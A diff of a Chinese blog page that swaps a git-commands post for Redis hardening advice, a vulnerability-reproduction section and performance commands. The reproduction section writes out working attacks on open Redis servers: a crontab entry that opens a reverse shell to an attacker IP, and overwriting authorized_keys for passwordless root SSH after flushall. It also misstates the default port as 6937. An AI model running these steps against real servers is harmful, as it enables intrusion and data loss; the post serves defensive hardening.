@@ -9,20 +9,20 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
     
 
-    <title> git的日常操作命令整理 | Anttu&#39;s Blog</title>
-    <meta property="og:title" content=" git的日常操作命令整理 - Anttu&#39;s Blog">
+    <title>redis日常使用的一些建议 | Anttu&#39;s Blog</title>
+    <meta property="og:title" content="redis日常使用的一些建议 - Anttu&#39;s Blog">
     <meta property="og:type" content="article">
         
-    <meta property="article:published_time" content='2021-10-19T00:29:47&#43;08:00'>
+    <meta property="article:published_time" content='2022-03-05T00:29:47&#43;08:00'>
         
         
-    <meta property="article:modified_time" content='2021-10-19T00:29:47&#43;08:00'>
+    <meta property="article:modified_time" content='2022-03-05T00:29:47&#43;08:00'>
         
     <meta name="Keywords" content="golang,go语言,go语言笔记,anttu,java,博客,bash,linux笔记,python笔记,公众号,小程序">
-    <meta name="description" content="git的日常操作命令整理">
+    <meta name="description" content="redis日常使用的一些建议">
         
     <meta name="author" content="Anttu">
-    <meta property="og:url" content="https://anTtutu.github.io/post/2021-10-19-git/">
+    <meta property="og:url" content="https://anTtutu.github.io/post/2022-03-05-redis_safe/">
     <link rel="shortcut icon" href='/favicon.ico'  type="image/x-icon">
 
     <link rel="stylesheet" href='/css/normalize.css'>
@@ -142,16 +142,30 @@
         <nav id="TableOfContents">
   <ul>
     <li><a href="#前言">前言</a></li>
-    <li><a href="#1下载">1、下载</a></li>
-    <li><a href="#2撤销commit">2、撤销commit</a></li>
-    <li><a href="#3修改commit注释">3、修改commit注释</a></li>
-    <li><a href="#4撤销modify">4、撤销modify</a></li>
-    <li><a href="#5撤销push">5、撤销push</a></li>
-    <li><a href="#6新增文件">6、新增文件</a></li>
-    <li><a href="#7删除已经add的文件">7、删除已经add的文件</a></li>
-    <li><a href="#8修改历史commit的log">8、修改历史commit的log</a></li>
-    <li><a href="#9状态">9、状态</a></li>
-    <li><a href="#10差异">10、差异</a></li>
+    <li><a href="#1安全建议">1、安全建议</a>
+      <ul>
+        <li><a href="#11设置bind">1.1、设置bind</a></li>
+        <li><a href="#12设置auth">1.2、设置auth</a></li>
+        <li><a href="#13设置port">1.3、设置port</a></li>
+        <li><a href="#14设置config">1.4、设置config</a></li>
+        <li><a href="#15可选设置rename-command">1.5、【可选】设置rename-command</a></li>
+      </ul>
+    </li>
+    <li><a href="#2漏洞复现">2、漏洞复现</a>
+      <ul>
+        <li><a href="#21-利用crontab反弹shell">2.1 利用crontab反弹shell</a></li>
+        <li><a href="#22-利用写authorized_keys实现无密码登录">2.2 利用写authorized_keys实现无密码登录</a></li>
+      </ul>
+    </li>
+    <li><a href="#3性能分析">3、性能分析</a>
+      <ul>
+        <li><a href="#31-测试最大响应延迟">3.1 测试最大响应延迟</a></li>
+        <li><a href="#32-查看一段时间内最小最大平均访问延迟">3.2 查看一段时间内最小、最大、平均访问延迟</a></li>
+        <li><a href="#33-性能测试">3.3 性能测试</a></li>
+        <li><a href="#34-查看慢日志">3.4 查看慢日志</a></li>
+        <li><a href="#35-查看bigkey">3.5 查看bigkey</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
     </div>
@@ -185,18 +199,18 @@
 </script>
     <article class="post">
         <header>
-            <h1 class="post-title"> git的日常操作命令整理</h1>
+            <h1 class="post-title">redis日常使用的一些建议</h1>
         </header>
         <date class="post-meta meta-date">
-            2021年10月19日
+            2022年3月5日
         </date>
         
         <div class="post-meta">
             <span>|</span>
             
-            <span class="meta-category"><a href='/categories/git'>git</a></span>
+            <span class="meta-category"><a href='/categories/redis'>redis</a></span>
             
-            <span class="meta-category"><a href='/categories/linux'>linux</a></span>
+            <span class="meta-category"><a href='/categories/safe'>safe</a></span>
             
         </div>
         
@@ -215,65 +229,72 @@
         
         <div class="post-content">
             <h2 id="前言">前言</h2>
-<p>git的一些常见命令操作整理</p>
-<h2 id="1下载">1、下载</h2>
-<p>depth用于指定克隆深度，为1即表示只克隆最近一次commit，可以减少下载的容量</p>
+<p>最近处理了几起redis不安全的阿里云服务器，总结下一些建议</p>
+<h2 id="1安全建议">1、安全建议</h2>
+<h3 id="11设置bind">1.1、设置bind</h3>
+<p>默认bind 0.0.0.0是默认值，相当于不设防</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git cone --depth<span style="color:#000;font-weight:bold">=</span><span style="color:#099">1</span> <span style="color:#000;font-weight:bold">{</span>http://xxx/url<span style="color:#000;font-weight:bold">}</span>
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#0086b3">bind</span> 0.0.0.0
+建议修改成链接端的IP，比如
+<span style="color:#0086b3">bind</span> 192.168.100.101
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="2撤销commit">2、撤销commit</h2>
-<p>默认撤销，不撤销本地代码，撤销commit，并且撤销git add</p>
+</div><h3 id="12设置auth">1.2、设置auth</h3>
+<p>默认是不设置密码，相当于不需要密码和鉴权就可以访问</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git reset --mixed HEAD^
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">requirepass foobared
+建议开启密码访问，并且不能设置弱口令密码，比如
+requirepass Admin9527#&amp;@ekd452
 </code></pre></td></tr></table>
 </div>
-</div><p>不删除工作空间改动代码，撤销commit，不撤销git add</p>
+</div><h3 id="13设置port">1.3、设置port</h3>
+<p>默认是6937，容易被扫描到</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git reset --soft HEAD^
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">port <span style="color:#099">6379</span>
+建议修改默认端口，比如
+port <span style="color:#099">36379</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>删除工作空间改动代码，撤销commit，撤销git add</p>
+</div><h3 id="14设置config">1.4、设置config</h3>
+<p>检查config这2个文件设置的值是否自己设置的值</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git reset --hard HEAD^
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">192.168.210.142:36379&gt; config get dbfilename
+1<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;dbfilename&#34;</span>
+2<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;dump.rdb&#34;</span>
+192.168.210.142:36379&gt; config get dir
+1<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;dir&#34;</span>
+2<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;./&#34;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="3修改commit注释">3、修改commit注释</h2>
-<p>进入 vim 模式</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git commit --amend
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="4撤销modify">4、撤销modify</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git checkout <span style="color:#000;font-weight:bold">{</span>filePath/fileName<span style="color:#000;font-weight:bold">}</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="5撤销push">5、撤销push</h2>
+</div><h3 id="15可选设置rename-command">1.5、【可选】设置rename-command</h3>
+<p>把危险命令重命名，增加一些难度，作为可选方式</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -282,13 +303,38 @@
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># 查看log清单拿到需要回退的commitId</span>
-git log 
-git reset --soft <span style="color:#000;font-weight:bold">{</span>bc07480025bca168e2136064d795f2bb56eab999<span style="color:#000;font-weight:bold">}</span>
-git push origin <span style="color:#000;font-weight:bold">{</span>master<span style="color:#000;font-weight:bold">}</span> --force
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rename-command KEYS <span style="color:#d14">&#34;kk&#34;</span>
+rename-command FLUSHALL <span style="color:#d14">&#34;ff&#34;</span>
+rename-command SHUTDOWN <span style="color:#d14">&#34;ss&#34;</span>
+rename-command CONFIG <span style="color:#d14">&#34;cc&#34;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="6新增文件">6、新增文件</h2>
+</div><h2 id="2漏洞复现">2、漏洞复现</h2>
+<h3 id="21-利用crontab反弹shell">2.1 利用crontab反弹shell</h3>
+<p>登录redis设置</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#redis-cli -h 10.1.1.2 -a 123456 //如果没有密码，不用添加-a参数</span>
+10.1.1.2:6379&gt; config <span style="color:#0086b3">set</span> dir /var/spool/cron
+OK
+10.1.1.2:6379&gt; config <span style="color:#0086b3">set</span> dbfilename root
+OK
+10.1.1.2:6379&gt; <span style="color:#0086b3">set</span> xxoo <span style="color:#d14">&#34;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.1/1234 0&gt;&amp;1\n\n&#34;</span>
+10.1.1.2:6379&gt;save
+OK
+</code></pre></td></tr></table>
+</div>
+</div><p>不登录redis设置</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -297,22 +343,306 @@ git push origin <span style="color:#000;font-weight:bold">{</span>master<span st
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># 全部新增</span>
-git add .
-<span style="color:#998;font-style:italic"># 单个文件新增</span>
-git add <span style="color:#000;font-weight:bold">{</span>filePath/fileName<span style="color:#000;font-weight:bold">}</span>
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#echo -e &#34;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.1/1234 0&gt;&amp;1\n\n&#34;|redis-cli -h 192.168.118.129 -a 123456 -x set 1</span>
+<span style="color:#998;font-style:italic">#redis-cli -h 192.168.118.129 -a 123456 config set dir /var/spool/cron/</span>
+<span style="color:#998;font-style:italic">#redis-cli -h 192.168.118.129 -a 123456 config set dbfilename root</span>
+<span style="color:#998;font-style:italic">#redis-cli -h 192.168.118.129 -a 123456 save</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="7删除已经add的文件">7、删除已经add的文件</h2>
+</div><p>在 10.1.1.1上执行</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git rm <span style="color:#000;font-weight:bold">{</span>filePath/fileName<span style="color:#000;font-weight:bold">}</span>
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic">#nc -l -p 1234 -vv //监听1234端口</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="8修改历史commit的log">8、修改历史commit的log</h2>
+</div><h3 id="22-利用写authorized_keys实现无密码登录">2.2 利用写authorized_keys实现无密码登录</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">127.0.0.1:6379&gt;flushall
+OK
+
+127.0.0.1:6379&gt;config <span style="color:#0086b3">set</span> dir /root/.ssh/
+OK
+
+127.0.0.1:6379&gt;config <span style="color:#0086b3">set</span> dbfilename authorized_keys
+OK
+
+127.0.0.1:6379&gt;set xxoo <span style="color:#d14">&#34;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxna91qSLsy9sbYSZNYMpe0root@localhost.localdomain\n\n&#34;</span>
+OK
+
+127.0.0.1:6379&gt;save
+OK
+</code></pre></td></tr></table>
+</div>
+</div><p>然后ssh方式就可以登录这台服务器了</p>
+<h2 id="3性能分析">3、性能分析</h2>
+<h3 id="31-测试最大响应延迟">3.1 测试最大响应延迟</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 127.0.0.1 -p <span style="color:#099">6379</span> --intrinsic-latency <span style="color:#099">60</span>
+Max latency so far: <span style="color:#099">1</span> microseconds.
+Max latency so far: <span style="color:#099">15</span> microseconds.
+Max latency so far: <span style="color:#099">17</span> microseconds.
+Max latency so far: <span style="color:#099">18</span> microseconds.
+Max latency so far: <span style="color:#099">31</span> microseconds.
+Max latency so far: <span style="color:#099">32</span> microseconds.
+Max latency so far: <span style="color:#099">59</span> microseconds.
+Max latency so far: <span style="color:#099">72</span> microseconds.
+
+<span style="color:#099">1428669267</span> total runs <span style="color:#000;font-weight:bold">(</span>avg latency: 0.0420 microseconds / 42.00 nanoseconds per run<span style="color:#000;font-weight:bold">)</span>.
+Worst run took 1429x longer than the average latency.
+</code></pre></td></tr></table>
+</div>
+</div><p>从输出结果可以看到，这60秒内的最大响应延迟为72微秒（0.072毫秒）。</p>
+<h3 id="32-查看一段时间内最小最大平均访问延迟">3.2 查看一段时间内最小、最大、平均访问延迟</h3>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 127.0.0.1 -p <span style="color:#099">6379</span> --latency-history -i <span style="color:#099">1</span>
+min: 0, max: 1, avg: 0.13 <span style="color:#000;font-weight:bold">(</span><span style="color:#099">100</span> samples<span style="color:#000;font-weight:bold">)</span> -- 1.01 seconds range
+min: 0, max: 1, avg: 0.12 <span style="color:#000;font-weight:bold">(</span><span style="color:#099">99</span> samples<span style="color:#000;font-weight:bold">)</span> -- 1.01 seconds range
+min: 0, max: 1, avg: 0.13 <span style="color:#000;font-weight:bold">(</span><span style="color:#099">99</span> samples<span style="color:#000;font-weight:bold">)</span> -- 1.01 seconds range
+min: 0, max: 1, avg: 0.10 <span style="color:#000;font-weight:bold">(</span><span style="color:#099">99</span> samples<span style="color:#000;font-weight:bold">)</span> -- 1.01 seconds range
+min: 0, max: 1, avg: 0.13 <span style="color:#000;font-weight:bold">(</span><span style="color:#099">98</span> samples<span style="color:#000;font-weight:bold">)</span> -- 1.00 seconds range
+min: 0, max: 1, avg: 0.08 <span style="color:#000;font-weight:bold">(</span><span style="color:#099">99</span> samples<span style="color:#000;font-weight:bold">)</span> -- 1.01 seconds range
+...
+</code></pre></td></tr></table>
+</div>
+</div><p>从输出结果看，每间隔1秒，采样Redis的平均操作耗时，其结果分布在0.08 ~ 0.13毫秒之间。</p>
+<h3 id="33-性能测试">3.3 性能测试</h3>
+<p>redis性能测试命令</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">redis-benchmark -h 127.0.0.1 -p <span style="color:#099">6379</span> -c <span style="color:#099">50</span> -n <span style="color:#099">10000</span> -q
+PING_INLINE: 63291.14 requests per second
+PING_BULK: 62500.00 requests per second
+SET: 49261.09 requests per second
+GET: 47619.05 requests per second
+INCR: 42194.09 requests per second
+LPUSH: 61349.69 requests per second
+RPUSH: 56818.18 requests per second
+LPOP: 47619.05 requests per second
+RPOP: 45045.04 requests per second
+SADD: 46296.30 requests per second
+SPOP: 59523.81 requests per second
+LPUSH <span style="color:#000;font-weight:bold">(</span>needed to benchmark LRANGE<span style="color:#000;font-weight:bold">)</span>: 56818.18 requests per second
+LRANGE_100 <span style="color:#000;font-weight:bold">(</span>first <span style="color:#099">100</span> elements<span style="color:#000;font-weight:bold">)</span>: 32362.46 requests per second
+LRANGE_300 <span style="color:#000;font-weight:bold">(</span>first <span style="color:#099">300</span> elements<span style="color:#000;font-weight:bold">)</span>: 13315.58 requests per second
+LRANGE_500 <span style="color:#000;font-weight:bold">(</span>first <span style="color:#099">450</span> elements<span style="color:#000;font-weight:bold">)</span>: 10438.41 requests per second
